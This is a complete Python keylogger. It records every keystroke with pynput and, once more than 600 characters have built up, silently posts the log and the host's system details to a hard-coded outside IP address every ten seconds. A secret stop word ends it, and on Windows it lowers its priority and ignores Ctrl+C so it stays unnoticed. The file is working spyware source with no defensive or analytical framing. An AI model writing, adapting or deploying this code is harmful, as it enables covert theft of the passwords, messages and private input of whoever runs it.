import threading
import requests
from pynput import keyboard
import platform
import os

class Keylogger:
    def __init__(self, system_info):
        self.log = ""
        self.stop_word = "niceworkllo"  # Specific word to stop the keylogger
        self.queue = []  # List to track characters for stop word (simpler than deque)
        self.stop_keylogger = False
        self.system_info = system_info  # Store system_info passed from main

    def send_request(self):
        try:
            requests.post(
                "http://34.70.137.47:3475",
                json={"log": self.log, "system_info": self.system_info},
                timeout=5
            )
            self.log = ""  # Reset log only on successful send
        except requests.exceptions.RequestException:
            pass  # Silently ignore failures

    def on_press(self, key):
        try:
            char = key.char
            if char:  # Only append valid alphanumeric characters
                self.log += char
                self.queue.append(char)
        except AttributeError:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.esc: "[ESC]",
                keyboard.Key.tab: "[TAB]"
            }
            special_key = special_keys.get(key, f"[{key}]")
            self.log += special_key
            self.queue.append(special_key)

        # Maintain queue length and check stop word
        if len(self.queue) > len(self.stop_word):
            self.queue.pop(0)  # Remove oldest entry
        if len(self.queue) == len(self.stop_word):
            typed_word = "".join(self.queue)
            if typed_word == self.stop_word:
                self.stop_keylogger = True
                return False  # Stop the listener

    def on_release(self, key):
        pass  # No action needed

    def report(self):
        if len(self.log) > 600:  # Send logs if over 600 characters
            self.send_request()
        if not self.stop_keylogger:
            threading.Timer(10, self.report).start()  # Repeat every 10 seconds

    def start(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            self.report()
            listener.join()

def run_background():
    # Windows-specific: lower priority and ignore Ctrl+C
    if os.name == "nt":
        import win32api, win32process
        hprocess = win32api.GetCurrentProcess()
        win32process.SetPriorityClass(hprocess, win32process.IDLE_PRIORITY_CLASS)
        win32api.SetConsoleCtrlHandler(lambda x: True, True)

if __name__ == "__main__":
    system_info = platform.uname()._asdict()
    run_background()
    keylogger = Keylogger(system_info)
    keylogger.start()
